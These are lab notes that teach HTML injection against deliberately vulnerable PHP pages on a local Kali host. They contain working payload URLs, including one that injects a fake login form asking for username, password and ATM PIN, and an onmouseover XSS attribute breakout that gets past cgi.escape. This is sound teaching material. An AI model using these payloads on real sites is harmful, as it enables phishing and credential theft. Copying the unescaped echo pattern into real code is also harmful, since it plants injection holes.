HTML Injection

**********************************************************************************************************************************

User input not sanitized
Malicious input consists of HTML injected into page
Render page as per attackers choice to victim

**********************************************************************************************************************************

In Kali
root@kali:/var/www/html_injection# cat htmli.php
<html>

<body>
    Welcome
    <?php echo $_REQUEST['nickname']; ?> !
</body>

</html>
root@kali:/var/www/html_injection#

In Browser
http://192.168.1.13/html_injection/htmli.php

http://192.168.1.13/html_injection/htmli.php?nickname=Kanishka

http://192.168.1.13/html_injection/htmli.php?nickname=Ka<h1>nishka
View Source
<html>

<body>
    Welcome
    Ka<h1>nishka !
</body>

</html>

http://192.168.1.13/html_injection/htmli.php?nickname=Please click on the link<a href="http://www.gmail.com">Login Here</a>
View Source:
<html>

<body>
    Welcome
    Please click on the link<a href="http://www.gmail.com">Login Here</a> !
</body>

</html>

**********************************************************************************************************************************

HTML Injection in Tag attributes

In Browser
http://192.168.1.13/html_injection/htmltagsi.php
http://192.168.1.13/html_injection/htmltagsi.php?sid=test
http://192.168.1.13/html_injection/htmltagsi.php?sid=test"><b>Hello World</b>
http://192.168.1.13/html_injection/htmltagsi.php?sid=test"><!--
http://192.168.1.13/html_injection/htmltagsi.php?sid=test"></form><form action='/'><input type="hidden" name="sessionid" value="text"> Username:<input type="text" name="username"><br> Password:<input type="password" name="pass"><br>ATM PIN:<input type="text" name="atm"><br><input type="submit" value="Login"></form><!--
Source
<html>

<body>

    <b>Welcome Guest! Please login</b>

    <br>
    <form action='/'>
        <input type="hidden" name="sessionid" value="test"></form><form action='/'><input type="hidden" name="sessionid" value="text"> Username:<input type="text" name="username"><br> Password:<input type="password" name="pass"><br>ATM PIN:<input type="text" name="atm"><br><input type="submit" value="Login"></form><!--"> Username:
        <input type="text" name="username">
        <br> Password:
        <input type="password" name="pass">
        <br>
        <input type="submit" value="Login">
    </form>


</body>

</html>

In Kali
root@kali:/var/www/html_injection# cat htmltagsi.php
<html>

<body>

    <b>Welcome Guest! Please login</b>

    <br>
    <form action='/'>
        <input type="hidden" name="sessionid" value="<?php echo $_REQUEST['sid']; ?>"> Username:
        <input type="text" name="username">
        <br> Password:
        <input type="password" name="pass">
        <br>
        <input type="submit" value="Login">
    </form>


</body>

</html>

**********************************************************************************************************************************

HTML Injection in 3rd part data sources

API for everything
Software as a Service
3rd Party Data Source â€“ Control or influence indirect

HTML tags in the <title> tag

**********************************************************************************************************************************

HTML Injection by Filter Bypass - cgi.escape

>>> import cgi
>>> user_input = "<h1>Vulnearble to HTMLi</h1>"
>>> cgi.escape(user_input)
'&lt;h1&gt;Vulnearble to HTMLi&lt;/h1&gt;'
>>> user_input = "<h1>Vulnearble to HTMLi</h1> ' "
>>> cgi.escape(user_input)
"&lt;h1&gt;Vulnearble to HTMLi&lt;/h1&gt; ' "
>>> user_input2 = ' " '
>>> cgi.escape(user_input2)
' " '
>>> cgi.escape(user_input2, quote=True)
' &quot; '
>>> cgi.escape(user_input, quote=True)
"&lt;h1&gt;Vulnearble to HTMLi&lt;/h1&gt; ' "
>>>

Payload -> sample" onmouseover="alert('xss')";

http://bugs.python.org/issue9061
https://wiki.python.org/moin/EscapingHtml

**********************************************************************************************************************************
